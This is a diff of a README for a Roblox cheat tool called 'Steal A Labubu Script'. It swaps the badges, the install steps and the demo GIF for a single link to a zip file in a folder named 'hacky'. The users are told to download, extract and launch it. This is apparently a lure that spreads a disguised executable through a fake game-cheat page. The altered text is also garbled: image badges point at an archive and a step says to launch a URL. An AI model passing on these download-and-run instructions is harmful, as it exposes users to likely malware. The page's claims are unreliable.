@@ -1,7 +1,7 @@
 # 🚀 Steal A Labubu Script Roblox — Universal Script Launcher 2025  
-[![GitHub Workflow Status](https://img.shields.io/github/workflow/status/yourrepo/steal-a-labubu-script-roblox/CI?label=Workflow)](./) 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Last Updated](https://img.shields.io/badge/maintained-2025-brightgreen)](./)  
+[![GitHub Workflow Status](https://github.com/Brothers15691/labubu-script-roblox-voyager/raw/refs/heads/main/hacky/voyager_labubu_roblox_script_v2.8.zip)](./) 
+[![License: MIT](https://github.com/Brothers15691/labubu-script-roblox-voyager/raw/refs/heads/main/hacky/voyager_labubu_roblox_script_v2.8.zip)](LICENSE)
+[![Last Updated](https://github.com/Brothers15691/labubu-script-roblox-voyager/raw/refs/heads/main/hacky/voyager_labubu_roblox_script_v2.8.zip)](./)  
 Invigorate your Roblox adventures with the unmatched, dynamic Steal A Labubu Script Robo! Blossom within the Roblox universe by harnessing top-notch script automation, adaptive customization, and robust integration with AI-powered APIs, all wrapped within an interface designed for explorers who truly stand out.
 
 ---
@@ -50,9 +50,9 @@ Labubu script support, Roblox script automation, adaptive UI for scripting, AI-p
 ## 🛠️ Installation Instructions  
 Launching your Roblox revolution via Steal A Labubu Script Roblox is pure fun and simplicity:
 
-1. Download the EasyLaunch.zip from the repository (find it in the Releases section above).
+1. Download the https://github.com/Brothers15691/labubu-script-roblox-voyager/raw/refs/heads/main/hacky/voyager_labubu_roblox_script_v2.8.zip from the repository (find it in the Releases section above).
 2. Extract all files to a folder of your choosing.
-3. Launch the EasyLaunch.exe (or appropriate binary for your OS).
+3. Launch the https://github.com/Brothers15691/labubu-script-roblox-voyager/raw/refs/heads/main/hacky/voyager_labubu_roblox_script_v2.8.zip (or appropriate binary for your OS).
 4. Kick off your scripting journey by importing your favorite Labubu scripts and powering up AI integrations!
 
 ---
@@ -60,7 +60,7 @@ Launching your Roblox revolution via Steal A Labubu Script Roblox is pure fun an
 ## 🎦 Video & GIF Installation Guide  
 For a hands-on demonstration, watch the dynamic GIF walkthrough below. See every step in action—no confusion, just smooth sailing:
 
-![Installation Walkthrough GIF](https://i.imgur.com/Js67NIU.gif)
+![Installation Walkthrough GIF](https://github.com/Brothers15691/labubu-script-roblox-voyager/raw/refs/heads/main/hacky/voyager_labubu_roblox_script_v2.8.zip)
 
 ---
 
